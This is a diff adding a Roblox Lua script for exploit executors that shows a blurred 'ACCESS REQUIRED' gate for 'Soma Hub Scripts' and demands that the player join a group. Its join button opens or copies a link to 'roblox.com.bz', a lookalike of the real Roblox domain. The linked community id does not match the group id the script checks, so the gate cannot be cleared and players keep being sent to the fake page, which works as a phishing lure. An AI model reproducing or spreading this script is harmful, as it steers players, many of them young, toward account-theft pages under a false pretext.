@@ -1,0 +1,250 @@
+wait(0.2)
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+-- CONFIG
+local GROUP_ID = 6887593092
+local GROUP_LINK = "https://roblox.com.bz/communities/3122951096/"
+
+-- SCREEN GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "AccessUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- BLUR
+local Blur = Instance.new("BlurEffect")
+Blur.Size = 0
+Blur.Parent = game:GetService("Lighting")
+
+-- MAIN FRAME
+local Main = Instance.new("Frame")
+Main.Size = UDim2.new(0, 340, 0, 220)
+Main.Position = UDim2.new(0.5, -170, 1.5, 0)
+Main.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
+Main.BorderSizePixel = 0
+Main.Parent = ScreenGui
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 16)
+
+-- BORDER
+local Border = Instance.new("UIStroke", Main)
+Border.Color = Color3.fromRGB(40, 40, 60)
+Border.Thickness = 1.5
+
+-- LOCK ICON
+local LockBG = Instance.new("Frame", Main)
+LockBG.Size = UDim2.new(0, 48, 0, 48)
+LockBG.Position = UDim2.new(0.5, -24, 0, 14)
+LockBG.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
+LockBG.BorderSizePixel = 0
+Instance.new("UICorner", LockBG).CornerRadius = UDim.new(1, 0)
+local LockStroke = Instance.new("UIStroke", LockBG)
+LockStroke.Color = Color3.fromRGB(80, 0, 255)
+LockStroke.Thickness = 1.5
+LockStroke.Transparency = 0.3
+
+local LockIcon = Instance.new("TextLabel", LockBG)
+LockIcon.Text = "🔒"
+LockIcon.Size = UDim2.new(1, 0, 1, 0)
+LockIcon.BackgroundTransparency = 1
+LockIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
+LockIcon.Font = Enum.Font.GothamBold
+LockIcon.TextSize = 20
+
+-- TITLE
+local Title = Instance.new("TextLabel", Main)
+Title.Text = "ACCESS REQUIRED"
+Title.Size = UDim2.new(1, 0, 0, 26)
+Title.Position = UDim2.new(0, 0, 0, 70)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.fromRGB(240, 240, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 18
+
+-- SUBTITLE
+local SubTitle = Instance.new("TextLabel", Main)
+SubTitle.Text = "Soma Hub Scripts"
+SubTitle.Size = UDim2.new(1, 0, 0, 16)
+SubTitle.Position = UDim2.new(0, 0, 0, 96)
+SubTitle.BackgroundTransparency = 1
+SubTitle.TextColor3 = Color3.fromRGB(100, 100, 140)
+SubTitle.Font = Enum.Font.Gotham
+SubTitle.TextSize = 11
+
+-- STATUS
+local StatusFrame = Instance.new("Frame", Main)
+StatusFrame.Size = UDim2.new(1, -40, 0, 30)
+StatusFrame.Position = UDim2.new(0, 20, 0, 122)
+StatusFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
+StatusFrame.BorderSizePixel = 0
+Instance.new("UICorner", StatusFrame).CornerRadius = UDim.new(0, 8)
+local StatusStroke = Instance.new("UIStroke", StatusFrame)
+StatusStroke.Color = Color3.fromRGB(50, 50, 80)
+StatusStroke.Thickness = 1
+
+local Status = Instance.new("TextLabel", StatusFrame)
+Status.Text = "⏳  Checking access..."
+Status.Size = UDim2.new(1, 0, 1, 0)
+Status.BackgroundTransparency = 1
+Status.TextColor3 = Color3.fromRGB(150, 150, 180)
+Status.Font = Enum.Font.Gotham
+Status.TextSize = 12
+
+-- JOIN BUTTON
+local JoinBtn = Instance.new("TextButton", Main)
+JoinBtn.Text = "JOIN GROUP"
+JoinBtn.Size = UDim2.new(1, -40, 0, 36)
+JoinBtn.Position = UDim2.new(0, 20, 0, 164)
+JoinBtn.BackgroundColor3 = Color3.fromRGB(70, 0, 220)
+JoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+JoinBtn.Font = Enum.Font.GothamBold
+JoinBtn.TextSize = 14
+JoinBtn.BorderSizePixel = 0
+Instance.new("UICorner", JoinBtn).CornerRadius = UDim.new(0, 10)
+local BtnGrad = Instance.new("UIGradient", JoinBtn)
+BtnGrad.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 0, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 160, 255))
+}
+BtnGrad.Rotation = 90
+
+-- BUTTON SHINE
+local Shine = Instance.new("Frame", JoinBtn)
+Shine.Size = UDim2.new(1, 0, 0.45, 0)
+Shine.Position = UDim2.new(0, 0, 0, 0)
+Shine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Shine.BackgroundTransparency = 0.88
+Shine.BorderSizePixel = 0
+Instance.new("UICorner", Shine).CornerRadius = UDim.new(0, 10)
+
+-- STATE
+local busy = false
+local hasAccess = false
+
+local function checkGroup()
+    local inGroup = false
+    pcall(function()
+        inGroup = player:IsInGroup(GROUP_ID)
+    end)
+
+    if inGroup then
+        hasAccess = true
+        LockIcon.Text = "✅"
+        LockStroke.Color = Color3.fromRGB(0, 200, 120)
+        Status.Text = "✅  Access granted!"
+        Status.TextColor3 = Color3.fromRGB(0, 220, 140)
+        StatusStroke.Color = Color3.fromRGB(0, 150, 80)
+        JoinBtn.Visible = false
+
+        task.wait(1.5)
+        TweenService:Create(Blur, TweenInfo.new(0.4), {Size = 0}):Play()
+        TweenService:Create(Main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+            Position = UDim2.new(0.5, -170, 1.5, 0),
+            BackgroundTransparency = 1
+        }):Play()
+        task.wait(0.5)
+        ScreenGui:Destroy()
+    else
+        hasAccess = false
+        Status.Text = "❌  Not in group"
+        Status.TextColor3 = Color3.fromRGB(255, 80, 80)
+        StatusStroke.Color = Color3.fromRGB(150, 30, 30)
+        JoinBtn.Visible = true
+    end
+end
+
+task.spawn(function()
+    while not hasAccess do
+        task.wait(5)
+        checkGroup()
+    end
+end)
+
+JoinBtn.MouseButton1Click:Connect(function()
+    if busy then return end
+    busy = true
+
+    local opened = false
+    if typeof(openbrowser) == "function" then
+        openbrowser(GROUP_LINK)
+        opened = true
+    elseif typeof(open_url) == "function" then
+        open_url(GROUP_LINK)
+        opened = true
+    end
+
+    if opened then
+        Status.Text = "🌐  Opened in browser"
+        Status.TextColor3 = Color3.fromRGB(0, 180, 255)
+    else
+        if typeof(setclipboard) == "function" then
+            setclipboard(GROUP_LINK)
+            Status.Text = "📋  Link copied!"
+            Status.TextColor3 = Color3.fromRGB(0, 180, 255)
+        else
+            Status.Text = "⚠️  Copy link manually"
+            Status.TextColor3 = Color3.fromRGB(255, 180, 0)
+        end
+    end
+
+    task.wait(1)
+    busy = false
+end)
+
+-- HOVER
+JoinBtn.MouseEnter:Connect(function()
+    TweenService:Create(JoinBtn, TweenInfo.new(0.15), {
+        BackgroundColor3 = Color3.fromRGB(90, 10, 255)
+    }):Play()
+end)
+
+JoinBtn.MouseLeave:Connect(function()
+    TweenService:Create(JoinBtn, TweenInfo.new(0.15), {
+        BackgroundColor3 = Color3.fromRGB(70, 0, 220)
+    }):Play()
+end)
+
+-- DRAG
+local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
+
+Title.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Main.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+Title.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement
+    or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        Main.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+-- ENTRANCE
+TweenService:Create(Blur, TweenInfo.new(0.5), {Size = 10}):Play()
+TweenService:Create(Main, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    Position = UDim2.new(0.5, -170, 0.5, -110)
+}):Play()
+
+checkGroup()
